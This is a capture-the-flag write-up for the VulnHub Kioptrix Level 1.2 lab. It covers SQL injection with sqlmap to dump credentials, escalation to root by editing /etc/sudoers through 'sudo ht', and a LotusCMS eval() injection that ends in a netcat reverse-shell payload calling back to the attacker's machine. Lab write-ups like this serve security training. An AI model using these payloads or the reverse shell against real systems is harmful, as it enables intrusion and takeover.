# Machine Link:
https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

## Machine Details

**OS** - Linux (CentOS)

**Web-Technology** - PHP/5.2.4

**IP** - 192.168.56.101

**Users** :
**loneferret**
**dreg**

**CREDENTIAL (ANY):**

**loneferret : starwars**

**dreg : Mast3r** 


We need to manually add kioptix3.com and its IP to /etc/hosts :
```bash
vim /etc/hosts

kioptix3.com 192.168.56.101
```

# Nmap Results:

```bash
PORT STATE SERVICE VERSION
**22**/tcp open ssh OpenSSH 4.7p1 **Debian 8ubuntu1.2** (protocol 2.0)
| ssh-hostkey:
| 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_ 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
**80**/tcp open http Apache httpd 2.2.8 ((Ubuntu) **PHP/5.2.4**-2ubuntu5.6 with **Suhosin-Patch**)
|_http-title: Ligoat Security - Got Goat? Security ...
```

<img width="1035" height="357" alt="image" src="https://github.com/user-attachments/assets/7e964748-0689-4949-9640-694fdab4db5f" />


---
# Exploiting through sql-injection vulnerability


Hitting the port 80 and we found the ligoat web application :

<img width="1912" height="1046" alt="image" src="https://github.com/user-attachments/assets/80a31aa3-8881-404c-afb2-142b14a13ad9" />


Going to the **gallery** section, go to the **Ligoat Press Room**, we have the sorting options here. Set it to photo id and here by giving the **1'** we can generate **mysql** error.

<img width="1919" height="607" alt="image" src="https://github.com/user-attachments/assets/5a6a40f4-2d25-4308-a506-5e127cf34b27" />


## Generating mysql error

<img width="1919" height="1050" alt="image" src="https://github.com/user-attachments/assets/ad83f49d-ca03-49ec-b544-2f82c6a4bd34" />


## Sqlmap

Now we can use the sqlmap to find the database details :

```bash
sqlmap -u http://kioptrix3.com/gallery/gallery.php\?id\=1 --dbs -batch
```


<img width="863" height="346" alt="image" src="https://github.com/user-attachments/assets/f0ea6c6d-f334-4826-a06b-c6d310ac1931" />


## Finding user credentials through sqlmap :

```bash
sqlmap -u http://kioptrix3.com/gallery/gallery.php\?id\=1 -T dev_accounts --dump
```

<img width="931" height="183" alt="image" src="https://github.com/user-attachments/assets/07ad345b-a203-4be4-9890-949749f561d3" />
We found the two username and thier password. Let's try loging in with them through ssh.

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@192.168.56.101
```

<img width="1372" height="649" alt="image" src="https://github.com/user-attachments/assets/4619f6ed-fcf3-4c9a-bd1c-3f7a576f5542" />

----
## Privelege Escalation

Once logged in with loneferret user, in this user's directory we found a **CompanyPolicy.README** file which has this content :

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

Now we know we have a ht command through which we can edit and create text files. So directly we will use **sudo ht**
to edit the **/etc/sudoers** file to give the loneferret user the power to run any command as sudo.

```bash
sudo ht /etc/sudoers
```

A similar interface will pop up use **f3** to open the **/etc/sudoers** file. (If there is an error of xterm colour )
<img width="1918" height="1048" alt="image" src="https://github.com/user-attachments/assets/da3c8a7d-db04-4708-8331-61b37a5970d8" />


Add the line `loneferret ALL=(ALL) ALL` 
<img width="1380" height="884" alt="image" src="https://github.com/user-attachments/assets/5ea0f957-f6d1-435b-a77b-78737ee388e9" />


Use **f2** to save and **f10** to quit the file.

Now you can easily use **sudo su** command to switch to the root user.


<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/4a5d1760-aecc-40d6-b89f-4784982b88d9" />


----
# Exploiting through LotusCSM Vulnerability

## Community Attack Vectors (To-Try List):
- **80** **HTTP** → Wfuzz FIle/Directory Discover → Nikto Scan → .svn, .DS_STORE, robots.txt, manual inspection
	- Web Application (lotus cms)
	- searchsploit lotuscms :
		**LotusCMS 3.0** - 'eval()' Remote Command Execution (Metasploi | php/remote/18565.rb
		-> Payload suggests that the parameter ~={red}***?page***=~ is vulnerable to RCE.
	- Valid Parameter : index
	- Invalid Parameter : ' **'** '
	- Invalid Parameter output : **Warning**: Unexpected character in input: ''' (ASCII=39) state=1 in **/home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code** on line **1**
	- eval : Evaluate a string as PHP code

- **22** **ssh**→

---

## Web Service Enumeration

### NIKTO
```bash
nikto -host kioptix3.com -C all
```

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    kioptix3.com
+ Target Port:        80
+ Start Time:         2024-12-26 16:17:56 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) **PHP/5.2.4-2ubuntu5.6** with **Suhosin-Patch**
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /**phpmyadmin**/: phpMyAdmin directory found.
+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

---
### WFUZZ

#### FILES: / (Web Root)
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://192.168.56.101/FUZZ

000000001: 200 38 L 190 W 1819 Ch index.php
000000011: 200 0 L 2 W 18 Ch update.php
```

#### DIRECTORIES: / (Web Root)
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://192.168.56.101/FUZZ
``
000000007:   301        9 L      31 W       355 Ch      cache                 
000000005:   301        9 L      31 W       357 Ch      modules              
000000120:   301        9 L      31 W       357 Ch      gallery               
000000234:   301        9 L      31 W       354 Ch      core                  
000000300:   301        9 L      31 W       360 Ch      phpmyadmin
```

---
## Manual Enumeration

Upon further manual inspection of the web application. We found that it is a CMS of **lotuscms**. Searching lotuscms vulnerability on searchsploit we got RCE(Remote Command Execution).

`LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                | php/remote/18565.rb`

When understanding the vulnerability the **?page** parameter is vulnerable to **eval()** function.

For this we need to change the method to **POST** and set the payload in **?page** parameter :

```
index');eval("system('id');");#
```


<img width="1496" height="756" alt="image" src="https://github.com/user-attachments/assets/33373aed-efb4-48fe-b48c-e4d90662230f" />


Now we need to just use netcat to get the reverse shell. 

```
page=index');eval("system('nc+192.168.31.252+443+-e+/bin/bash');");#
```

This will give us shell from www-data user.

---
## Take Away Concepts

- Vulnerabilities in CMS can lead to system access through RCE.

---



